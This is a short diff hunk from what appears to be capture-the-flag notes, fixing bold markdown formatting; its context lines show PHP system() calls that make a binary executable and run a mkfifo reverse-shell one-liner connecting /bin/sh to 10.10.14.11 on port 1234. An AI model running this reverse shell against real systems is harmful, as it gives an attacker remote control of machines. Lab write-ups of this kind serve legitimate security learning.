@@ -23,7 +23,7 @@ Check useful information:
 <?php system('chmod +x /dev/shm/harmless') ?>
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/harmless 10.10.14.11 1234 >/tmp/f') ?>
 ```
-**Try copy out to listen(TBC as CTF style):
+**Try copy out to listen(TBC as CTF style):**
 --------------------------------------------------------
 ```shell
 /home/xalvas/recov.wav -> recov.wav
